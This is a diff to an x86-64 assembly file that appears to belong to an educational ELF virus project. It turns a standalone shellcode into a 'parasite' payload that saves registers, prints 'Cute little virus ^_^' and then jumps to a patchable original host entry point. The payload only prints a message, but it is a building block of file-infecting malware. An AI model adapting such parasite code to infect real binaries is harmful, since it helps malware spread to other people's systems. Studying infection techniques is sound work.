@@ -1,3 +1,5 @@
+BITS 64
+
 ; Author : Abhinav Thakur
 ; Email  : compilepeace@gmail.com
 
@@ -11,12 +13,21 @@ section .text
 
 
 _start:
+
+	; Save register state
+	push rax
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push r11
+
 	
-	jmp	shellcode
-	message:	db	"-x-x-x-x- Cute little virus ^_^ -x-x-x-x-", 0xa
+	jmp	parasite
+	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
 
 
-shellcode:
+parasite:
 
 	; Print our message
 	xor	rax, rax					; Zero out RAX
@@ -25,14 +36,20 @@ shellcode:
 	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
 									; dynamically identifying the address of the 'message' label.
 	xor rdx, rdx
-	mov dl, 0x2b					; message size = 43 bytes (0x2b)
+	mov dl, 0x39					; message size = 57 bytes (0x39)
 	syscall					
 
-	mov	rax, 0xAAAAAAAAAAAAAAAA		; To be patched by original entry point
+
+	; Restoring register state
+	pop r11
+	pop rdi
+	pop rsi
+	pop rdx
+	pop rcx
+	pop rax
+
+	
+	; jmp to original host entry point (to be patched by kaal bhairav)
+	mov	rax, 0xAAAAAAAAAAAAAAAA		
 	jmp	rax
 
-	; Exit peacefully
-	xor	rax, rax			; Zero out RAX
-	mov rdi, rax			; Exit status
-	mov al, 0x3c			; exit() syscall number - 60 (0x3c)
-	syscall			
